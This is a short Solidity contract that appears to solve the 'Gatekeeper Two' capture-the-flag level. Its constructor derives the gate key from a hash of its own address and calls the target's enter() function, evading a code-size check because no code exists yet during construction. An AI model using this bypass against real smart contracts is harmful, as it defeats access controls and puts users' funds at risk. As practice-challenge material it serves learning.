// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwoSolver {

    constructor(IGatekeeperTwo _gate) {
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        _gate.enter(_gateKey);
    }
    function waiting() public {}
}

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}